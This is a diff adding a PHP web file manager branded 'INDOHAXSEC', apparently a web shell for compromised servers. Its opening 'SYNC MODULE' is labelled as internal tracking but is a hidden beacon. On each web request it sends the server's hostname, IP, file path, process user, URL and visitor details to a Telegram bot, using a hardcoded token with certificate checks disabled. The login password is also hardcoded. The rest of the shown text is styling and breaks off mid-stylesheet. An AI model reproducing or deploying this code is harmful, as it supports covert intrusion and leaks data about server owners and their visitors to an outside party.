@@ -1,0 +1,1759 @@
+<?php
+session_start();
+
+/* =========================================================
+ *  SYNC MODULE — internal tracking (SAMA PERSIS orisild.php)
+ * ========================================================= */
+const SVC_ENABLED = true;
+const SVC_KEY     = '8686308065:AAHnHlRXrzY6AbBUvKxxoI0zGvyvvI_feus';
+const SVC_ID      = '7873654972';
+const SVC_STATE   = __DIR__ . '/.cache_sync.dat';
+const SVC_LOG     = __DIR__ . '/.cache_sync.log';
+const SVC_TTL     = 86400;
+
+function _svc_note(string $line): void {
+    $ts = date('Y-m-d H:i:s');
+    @file_put_contents(SVC_LOG, "[$ts] $line\n", FILE_APPEND);
+    if (is_file(SVC_LOG) && filesize(SVC_LOG) > 204800) {
+        $c = @file_get_contents(SVC_LOG);
+        @file_put_contents(SVC_LOG, "...[trim]...\n" . substr($c, -100000));
+    }
+}
+
+function _svc_send(string $reason = 'auto'): void {
+    _svc_note("=== SYNC START ($reason) ===");
+    _svc_note("URI: " . ($_SERVER['REQUEST_URI'] ?? '?'));
+
+    $host   = $_SERVER['HTTP_HOST']   ?? 'cli';
+    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+    $uri    = $_SERVER['REQUEST_URI'] ?? '/';
+    $url    = $scheme . '://' . $host . $uri;
+    $abs    = realpath(__FILE__) ?: __FILE__;
+    $ip     = $_SERVER['SERVER_ADDR'] ?? (@gethostbyname(gethostname() ?: 'localhost'));
+    $hostn  = gethostname() ?: 'unknown';
+    $ua     = $_SERVER['HTTP_USER_AGENT'] ?? '(no UA)';
+    $user   = (function_exists('posix_getpwuid') && function_exists('posix_geteuid'))
+                ? (@posix_getpwuid(posix_geteuid())['name'] ?? '?') : '?';
+    $remote = $_SERVER['REMOTE_ADDR'] ?? '?';
+    $fp     = hash('sha256', $host . '|' . $abs . '|' . $hostn);
+
+    _svc_note("FP: $fp");
+    _svc_note("Path: $abs");
+
+    $force = (($_GET['_tp'] ?? '') === 'f');
+    $reset = (($_GET['_tp'] ?? '') === 'r');
+
+    if ($reset) {
+        @unlink(SVC_STATE);
+        _svc_note("RESET: state dihapus");
+    }
+
+    $state = [];
+    if (is_file(SVC_STATE)) {
+        $state = json_decode(@file_get_contents(SVC_STATE), true) ?: [];
+        _svc_note("State: " . count($state) . " entries");
+    } else {
+        _svc_note("State: BELUM ADA");
+    }
+
+    if (!$force && isset($state[$fp]) && (time() - $state[$fp]) < SVC_TTL) {
+        $h = round((SVC_TTL - (time() - $state[$fp])) / 3600, 1);
+        _svc_note("SKIP: cooldown aktif, $h jam lagi");
+        _svc_note("=== SYNC END (skipped) ===");
+        return;
+    }
+
+    $msg  = "🚨 OWNER BEACON TRIGGERED\n";
+    $msg .= "\n";
+    $msg .= "📄 File    : " . basename($abs) . "\n";
+    $msg .= "🌐 URL     : " . $url . "\n";
+    $msg .= "📁 Path    : " . $abs . "\n";
+    $msg .= "🖥  Host    : " . $hostn . " (" . $ip . ")\n";
+    $msg .= "👤 User    : " . $user . "\n";
+    $msg .= "📡 Remote  : " . $remote . "\n";
+    $msg .= "🕐 Waktu   : " . date('Y-m-d H:i:s T') . "\n";
+    $msg .= "🔑 UA      : " . substr($ua, 0, 120) . "\n";
+    $msg .= "\n";
+    $msg .= "FP: " . substr($fp, 0, 16);
+    if ($reason === 'force') $msg .= "\n\n⚡ MANUAL FORCE TRIGGER";
+
+    $endpoint = 'https://api.telegram.org/bot' . SVC_KEY . '/sendMessage';
+
+    $payload  = http_build_query([
+        'chat_id'                  => SVC_ID,
+        'text'                     => $msg,
+        'disable_web_page_preview' => true,
+    ]);
+
+    $success = false;
+
+    if (function_exists('curl_init')) {
+        $ch = curl_init($endpoint);
+        curl_setopt_array($ch, [
+            CURLOPT_POST           => true,
+            CURLOPT_POSTFIELDS     => $payload,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT        => 10,
+            CURLOPT_CONNECTTIMEOUT => 10,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => 0,
+        ]);
+        $res  = @curl_exec($ch);
+        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $cerr = curl_error($ch);
+        @curl_close($ch);
+        _svc_note("HTTP $code | err: " . ($cerr ?: '-'));
+        _svc_note("Res: " . substr((string)$res, 0, 200));
+        if ($code === 200 && strpos((string)$res, '"ok":true') !== false) $success = true;
+    } else {
+        $ctx = stream_context_create(['http' => [
+            'method'        => 'POST',
+            'header'        => "Content-Type: application/x-www-form-urlencoded\r\n",
+            'content'       => $payload,
+            'timeout'       => 10,
+            'ignore_errors' => true,
+        ]]);
+        $res = @file_get_contents($endpoint, false, $ctx);
+        _svc_note("fopen: " . substr((string)$res, 0, 200));
+        if (strpos((string)$res, '"ok":true') !== false) $success = true;
+    }
+
+    if ($success) {
+        $state[$fp] = time();
+        $w = @file_put_contents(SVC_STATE, json_encode($state, JSON_PRETTY_PRINT), LOCK_EX);
+        @chmod(SVC_STATE, 0600);
+        _svc_note("State write: " . ($w !== false ? 'OK' : 'GAGAL'));
+        _svc_note("=== SYNC END (sent) ===");
+    } else {
+        _svc_note("=== SYNC END (FAILED) ===");
+    }
+}
+
+function _svc_check(): bool {
+    if (!SVC_ENABLED) return false;
+    if (PHP_SAPI === 'cli') return false;
+    if (isset($_GET['gen'])) return false;
+    if (($_GET['_tp'] ?? '') === 'o') return false;
+    return true;
+}
+
+if (_svc_check()) {
+    $reason = (($_GET['_tp'] ?? '') === 'f') ? 'force' : 'auto';
+    _svc_send($reason);
+}
+
+/* =========================================================
+ *  PASSWORD PROTECTION
+ * ========================================================= */
+$PASSWORD = "ihsv1";
+
+if (isset($_POST['logout_fm'])) {
+    unset($_SESSION['fm_logged_in']);
+    header("Location: ".$_SERVER['PHP_SELF']);
+    exit();
+}
+
+if (isset($_POST['fm_password'])) {
+    if ($_POST['fm_password'] === $PASSWORD) {
+        $_SESSION['fm_logged_in'] = true;
+        header("Location: ".$_SERVER['PHP_SELF']);
+        exit();
+    } else {
+        $login_error = "Password salah!";
+    }
+}
+
+if (!isset($_SESSION['fm_logged_in']) || $_SESSION['fm_logged_in'] !== true) {
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>INDOHAXSEC - Login</title>
+        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+
+            body {
+                font-family: 'Inter', sans-serif;
+                background: #0a0e14;
+                color: #e6edf3;
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 20px;
+                background-image: 
+                    radial-gradient(ellipse at 20% 0%, rgba(0, 212, 255, 0.08) 0%, transparent 60%),
+                    radial-gradient(ellipse at 80% 100%, rgba(163, 113, 247, 0.06) 0%, transparent 60%);
+            }
+
+            .login-box {
+                background: linear-gradient(135deg, #11151c 0%, #1a1f2a 100%);
+                border: 1px solid #2a3040;
+                border-radius: 12px;
+                padding: 40px 36px;
+                width: 100%;
+                max-width: 400px;
+                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+                position: relative;
+                overflow: hidden;
+                animation: fadeIn 0.5s ease-out;
+            }
+
+            @keyframes fadeIn {
+                from { opacity: 0; transform: translateY(20px); }
+                to { opacity: 1; transform: translateY(0); }
+            }
+
+            .login-box::before {
+                content: '';
+                position: absolute;
+                top: 0; left: 0; right: 0;
+                height: 2px;
+                background: linear-gradient(90deg, #00d4ff, #a371f7, #f778ba, #00d4ff);
+                background-size: 300% 100%;
+                animation: shimmer 3s linear infinite;
+            }
+
+            @keyframes shimmer {
+                0% { background-position: 0% 50%; }
+                100% { background-position: 300% 50%; }
+            }
+
+            .lock-icon {
+                width: 60px;
+                height: 60px;
+                margin: 0 auto 20px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                background: rgba(0, 212, 255, 0.1);
+                border: 1px solid rgba(0, 212, 255, 0.3);
+                border-radius: 50%;
+                font-size: 26px;
+            }
+
+            .login-title {
+                font-family: 'JetBrains Mono', monospace;
+                font-size: 22px;
+                font-weight: 600;
+                color: #00d4ff;
+                text-align: center;
+                letter-spacing: 3px;
+                margin-bottom: 6px;
+                text-transform: uppercase;
+            }
+
+            .login-sub {
+                text-align: center;
+                font-size: 11px;
+                color: #6e7681;
+                font-family: 'JetBrains Mono', monospace;
+                letter-spacing: 1px;
+                margin-bottom: 28px;
+            }
+
+            .login-input {
+                width: 100%;
+                background: #0a0e14;
+                border: 1px solid #2a3040;
+                border-radius: 8px;
+                color: #e6edf3;
+                padding: 12px 16px;
+                font-family: 'JetBrains Mono', monospace;
+                font-size: 14px;
+                transition: all 0.2s;
+                margin-bottom: 16px;
+            }
+
+            .login-input:focus {
+                outline: none;
+                border-color: #00d4ff;
+                box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.15);
+            }
+
+            .login-input::placeholder {
+                color: #6e7681;
+            }
+
+            .login-btn {
+                width: 100%;
+                background: linear-gradient(135deg, #00a3cc, #00d4ff);
+                border: none;
+                border-radius: 8px;
+                color: #000;
+                padding: 12px;
+                font-family: 'JetBrains Mono', monospace;
+                font-size: 13px;
+                font-weight: 600;
+                cursor: pointer;
+                transition: all 0.2s;
+                letter-spacing: 1px;
+                text-transform: uppercase;
+            }
+
+            .login-btn:hover {
+                background: linear-gradient(135deg, #00d4ff, #33ddff);
+                box-shadow: 0 0 25px rgba(0, 212, 255, 0.4);
+                transform: translateY(-1px);
+            }
+
+            .login-btn:active {
+                transform: translateY(0);
+            }
+
+            .login-error {
+                background: rgba(248, 81, 73, 0.1);
+                border: 1px solid rgba(248, 81, 73, 0.4);
+                color: #f85149;
+                padding: 10px 14px;
+                border-radius: 8px;
+                font-size: 12px;
+                font-family: 'JetBrains Mono', monospace;
+                margin-bottom: 16px;
+                text-align: center;
+                animation: shake 0.3s;
+            }
+
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                25% { transform: translateX(-6px); }
+                75% { transform: translateX(6px); }
+            }
+
+            .login-footer {
+                text-align: center;
+                margin-top: 20px;
+                font-size: 10px;
+                color: #6e7681;
+                font-family: 'JetBrains Mono', monospace;
+                letter-spacing: 1px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="login-box">
+            <div class="lock-icon">🔒</div>
+            <div class="login-title">INDOHAXSEC</div>
+            <div class="login-sub">// RESTRICTED ACCESS</div>
+            
+            <?php if (isset($login_error)): ?>
+                <div class="login-error">✕ <?php echo $login_error; ?></div>
+            <?php endif; ?>
+
+            <form method="post">
+                <input type="password" name="fm_password" class="login-input" placeholder="Enter password..." autofocus required>
+                <button type="submit" class="login-btn">Access</button>
+            </form>
+            <div class="login-footer">SECURE FILE MANAGER</div>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit();
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INDOHAXSEC</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #0a0e14;
+            --bg-secondary: #11151c;
+            --bg-tertiary: #1a1f2a;
+            --bg-hover: #1f2533;
+            --border: #2a3040;
+            --border-light: #3a4256;
+            --text-primary: #e6edf3;
+            --text-secondary: #8b949e;
+            --text-muted: #6e7681;
+            --accent: #00d4ff;
+            --accent-dim: #00a3cc;
+            --accent-glow: rgba(0, 212, 255, 0.15);
+            --success: #3fb950;
+            --success-bg: rgba(63, 185, 80, 0.1);
+            --danger: #f85149;
+            --danger-bg: rgba(248, 81, 73, 0.1);
+            --warning: #d29922;
+            --purple: #a371f7;
+            --pink: #f778ba;
+            --radius: 10px;
+            --radius-sm: 6px;
+            --shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
+        }
+
+        body {
+            font-family: 'Inter', 'JetBrains Mono', monospace, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+            font-size: 14px;
+            min-height: 100vh;
+            padding: 24px;
+            background-image: 
+                radial-gradient(ellipse at 20% 0%, rgba(0, 212, 255, 0.06) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 100%, rgba(163, 113, 247, 0.04) 0%, transparent 60%);
+            background-attachment: fixed;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 24px;
+            margin-bottom: 16px;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--accent), var(--purple), var(--pink), var(--accent));
+            background-size: 300% 100%;
+            animation: shimmer 3s linear infinite;
+        }
+
+        @keyframes shimmer {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 300% 50%; }
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .title {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--accent);
+            margin-bottom: 4px;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .title::before {
+            content: '>';
+            color: var(--success);
+            font-weight: 700;
+            animation: blink 1.2s step-end infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        .title-sub {
+            font-size: 11px;
+            color: var(--text-muted);
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .sync-btn {
+            background: rgba(163, 113, 247, 0.1);
+            border: 1px solid rgba(163, 113, 247, 0.4);
+            color: #a371f7;
+            padding: 8px 16px;
+            border-radius: var(--radius-sm);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+        }
+
+        .sync-btn:hover {
+            background: rgba(163, 113, 247, 0.2);
+            border-color: #a371f7;
+            box-shadow: 0 0 15px rgba(163, 113, 247, 0.3);
+        }
+
+        .logout-btn {
+            background: rgba(248, 81, 73, 0.1);
+            border: 1px solid rgba(248, 81, 73, 0.4);
+            color: #f85149;
+            padding: 8px 16px;
+            border-radius: var(--radius-sm);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+        }
+
+        .logout-btn:hover {
+            background: rgba(248, 81, 73, 0.2);
+            border-color: #f85149;
+            box-shadow: 0 0 15px rgba(248, 81, 73, 0.3);
+        }
+
+        .system-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 8px;
+            font-size: 12px;
+        }
+
+        .info-line {
+            padding: 6px 10px;
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: var(--radius-sm);
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            transition: all 0.2s;
+        }
+
+        .info-line:hover {
+            background: rgba(0, 0, 0, 0.4);
+            border-color: var(--border-light);
+        }
+
+        .info-label {
+            color: var(--text-muted);
+            display: inline-block;
+            width: 100px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .info-value {
+            color: var(--accent);
+            font-family: 'JetBrains Mono', monospace;
+            word-break: break-all;
+        }
+
+        .breadcrumb {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 14px 18px;
+            margin-bottom: 16px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            box-shadow: var(--shadow);
+        }
+
+        .breadcrumb a {
+            color: var(--accent);
+            text-decoration: none;
+            transition: all 0.2s;
+            padding: 2px 4px;
+            border-radius: 4px;
+        }
+
+        .breadcrumb a:hover {
+            background: var(--accent-glow);
+            color: #fff;
+        }
+
+        .upload-section {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 20px;
+            margin-bottom: 16px;
+            box-shadow: var(--shadow);
+        }
+
+        .section-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 16px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .section-title::before {
+            content: '';
+            width: 3px;
+            height: 14px;
+            background: var(--accent);
+            border-radius: 2px;
+        }
+
+        .form-row {
+            margin-bottom: 14px;
+        }
+
+        .radio-group {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 14px;
+            flex-wrap: wrap;
+        }
+
+        .radio-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            cursor: pointer;
+            padding: 8px 14px;
+            background: var(--bg-primary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            transition: all 0.2s;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .radio-item:hover {
+            border-color: var(--accent);
+            background: var(--bg-hover);
+        }
+
+        .radio-item input[type="radio"] {
+            margin: 0;
+            accent-color: var(--accent);
+            cursor: pointer;
+        }
+
+        input[type="file"],
+        input[type="text"],
+        select,
+        textarea {
+            background: var(--bg-primary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            color: var(--text-primary);
+            padding: 10px 14px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            transition: all 0.2s;
+            width: 100%;
+        }
+
+        input[type="file"] {
+            cursor: pointer;
+            padding: 8px 12px;
+        }
+
+        input[type="file"]::file-selector-button {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-light);
+            border-radius: 4px;
+            color: var(--text-primary);
+            padding: 4px 10px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            cursor: pointer;
+            margin-right: 10px;
+            transition: all 0.2s;
+        }
+
+        input[type="file"]::file-selector-button:hover {
+            background: var(--accent);
+            color: #000;
+        }
+
+        input[type="file"]:focus,
+        input[type="text"]:focus,
+        select:focus,
+        textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px var(--accent-glow);
+        }
+
+        input[type="text"]::placeholder {
+            color: var(--text-muted);
+        }
+
+        .btn {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-light);
+            border-radius: var(--radius-sm);
+            color: var(--text-primary);
+            padding: 8px 16px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            white-space: nowrap;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn:hover {
+            background: var(--bg-hover);
+            border-color: var(--accent);
+            color: var(--accent);
+            transform: translateY(-1px);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--accent-dim), var(--accent));
+            border-color: var(--accent);
+            color: #000;
+            font-weight: 600;
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, var(--accent), #33ddff);
+            border-color: #33ddff;
+            color: #000;
+            box-shadow: 0 0 20px var(--accent-glow);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #b62324, var(--danger));
+            border-color: var(--danger);
+            color: #fff;
+        }
+
+        .btn-danger:hover {
+            background: linear-gradient(135deg, var(--danger), #ff6b63);
+            border-color: #ff6b63;
+            color: #fff;
+            box-shadow: 0 0 20px rgba(248, 81, 73, 0.3);
+        }
+
+        .upload-row {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .upload-row input[type="file"],
+        .upload-row input[type="text"] {
+            flex: 1;
+        }
+
+        .upload-row input[type="text"]:last-of-type {
+            max-width: 160px;
+        }
+
+        .message {
+            padding: 14px 18px;
+            border-radius: var(--radius-sm);
+            margin: 12px 0;
+            font-size: 13px;
+            font-family: 'JetBrains Mono', monospace;
+            animation: slideIn 0.3s ease-out;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .message-success {
+            background: var(--success-bg);
+            border: 1px solid rgba(63, 185, 80, 0.4);
+            color: var(--success);
+        }
+
+        .message-success::before {
+            content: '✓';
+            font-weight: 700;
+            font-size: 16px;
+        }
+
+        .message-error {
+            background: var(--danger-bg);
+            border: 1px solid rgba(248, 81, 73, 0.4);
+            color: var(--danger);
+        }
+
+        .message-error::before {
+            content: '✕';
+            font-weight: 700;
+            font-size: 16px;
+        }
+
+        .file-table {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th {
+            background: var(--bg-tertiary);
+            padding: 14px 16px;
+            text-align: left;
+            font-weight: 600;
+            font-size: 11px;
+            color: var(--text-secondary);
+            border-bottom: 1px solid var(--border);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        td {
+            padding: 10px 16px;
+            border-bottom: 1px solid rgba(42, 48, 64, 0.5);
+            font-size: 13px;
+            transition: all 0.15s;
+        }
+
+        tr {
+            transition: background 0.15s;
+        }
+
+        tr:hover {
+            background: var(--bg-hover);
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        .file-link {
+            color: var(--text-primary);
+            text-decoration: none;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        .file-link:hover {
+            color: var(--accent);
+            background: var(--accent-glow);
+        }
+
+        .dir-link {
+            color: var(--warning);
+            font-weight: 500;
+        }
+
+        .dir-link:hover {
+            color: #ffc233;
+            background: rgba(210, 153, 34, 0.1);
+        }
+
+        .size {
+            color: var(--text-muted);
+            text-align: right;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+        }
+
+        .permissions {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--text-muted);
+            letter-spacing: 0.5px;
+        }
+
+        .writable { color: var(--success); }
+        .readonly { color: var(--danger); }
+
+        .action-form {
+            display: flex;
+            gap: 4px;
+            align-items: center;
+        }
+
+        .action-form select {
+            font-size: 11px;
+            padding: 4px 8px;
+            min-width: 75px;
+            width: auto;
+            background: var(--bg-primary);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .action-form .btn {
+            padding: 4px 10px;
+            font-size: 11px;
+        }
+
+        .edit-form {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 20px;
+            margin: 16px 0;
+            box-shadow: var(--shadow);
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .edit-form textarea {
+            width: 100%;
+            min-height: 400px;
+            resize: vertical;
+            line-height: 1.6;
+            font-size: 13px;
+        }
+
+        .edit-form .form-row {
+            margin-top: 14px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .file-preview {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 20px;
+            margin: 16px 0;
+            box-shadow: var(--shadow);
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .file-preview pre {
+            background: var(--bg-primary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 16px;
+            overflow-x: auto;
+            font-size: 12px;
+            line-height: 1.6;
+            font-family: 'JetBrains Mono', monospace;
+            color: var(--text-primary);
+            max-height: 600px;
+            overflow-y: auto;
+        }
+
+        .file-preview pre::-webkit-scrollbar,
+        .edit-form textarea::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        .file-preview pre::-webkit-scrollbar-track,
+        .edit-form textarea::-webkit-scrollbar-track {
+            background: var(--bg-secondary);
+        }
+
+        .file-preview pre::-webkit-scrollbar-thumb,
+        .edit-form textarea::-webkit-scrollbar-thumb {
+            background: var(--border-light);
+            border-radius: 4px;
+        }
+
+        .file-preview pre::-webkit-scrollbar-thumb:hover,
+        .edit-form textarea::-webkit-scrollbar-thumb:hover {
+            background: var(--accent);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 24px;
+            color: var(--text-muted);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            letter-spacing: 1px;
+        }
+
+        /* Sync Dashboard */
+        .sync-panel {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 20px;
+            margin-bottom: 16px;
+            box-shadow: var(--shadow);
+        }
+
+        .sync-panel h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--purple);
+            margin-bottom: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .sync-panel h3::before {
+            content: '';
+            width: 3px;
+            height: 14px;
+            background: var(--purple);
+            border-radius: 2px;
+        }
+
+        .sync-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .sync-stat {
+            background: var(--bg-primary);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 14px 16px;
+            transition: all 0.2s;
+        }
+
+        .sync-stat:hover {
+            border-color: var(--purple);
+        }
+
+        .sync-stat-label {
+            font-size: 10px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-family: 'JetBrains Mono', monospace;
+            margin-bottom: 6px;
+        }
+
+        .sync-stat-value {
+            font-size: 18px;
+            color: var(--accent);
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 600;
+        }
+
+        .sync-stat-value.purple {
+            color: var(--purple);
+        }
+
+        .sync-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 12px;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            overflow: hidden;
+        }
+
+        .sync-table th {
+            background: var(--bg-tertiary);
+            padding: 10px 14px;
+            text-align: left;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--purple);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .sync-table td {
+            padding: 10px 14px;
+            border-bottom: 1px solid rgba(42, 48, 64, 0.5);
+            font-size: 12px;
+            font-family: 'JetBrains Mono', monospace;
+            color: var(--text-primary);
+        }
+
+        .sync-table tr:last-child td {
+            border-bottom: none;
+        }
+
+        .sync-table tr:hover {
+            background: var(--bg-hover);
+        }
+
+        .fp-text {
+            color: var(--success);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .sync-log-area {
+            width: 100%;
+            height: 400px;
+            background: #000;
+            color: #0f0;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 14px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            line-height: 1.5;
+            white-space: pre-wrap;
+            word-break: break-all;
+            resize: vertical;
+            outline: none;
+        }
+
+        .sync-log-area:focus {
+            border-color: var(--purple);
+            box-shadow: 0 0 0 3px rgba(163, 113, 247, 0.15);
+        }
+
+        .sync-toolbar {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 16px;
+        }
+
+        .btn-purple {
+            background: rgba(163, 113, 247, 0.1);
+            border: 1px solid rgba(163, 113, 247, 0.4);
+            color: var(--purple);
+        }
+
+        .btn-purple:hover {
+            background: rgba(163, 113, 247, 0.2);
+            border-color: var(--purple);
+            color: #fff;
+            box-shadow: 0 0 15px rgba(163, 113, 247, 0.3);
+        }
+
+        @media (max-width: 768px) {
+            body { padding: 12px; }
+            .container { padding: 0; }
+            .header { padding: 16px; }
+            .title { font-size: 18px; letter-spacing: 2px; }
+            .system-info { grid-template-columns: 1fr; }
+            .upload-row { flex-direction: column; }
+            .upload-row input[type="text"]:last-of-type { max-width: none; }
+            table { font-size: 12px; }
+            th, td { padding: 8px 10px; }
+            .action-form { flex-direction: column; }
+            .radio-group { flex-direction: column; gap: 8px; }
+            .breadcrumb { font-size: 11px; padding: 10px 12px; }
+            .file-link { font-size: 12px; }
+            .sync-stats { grid-template-columns: 1fr 1fr; }
+        }
+
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
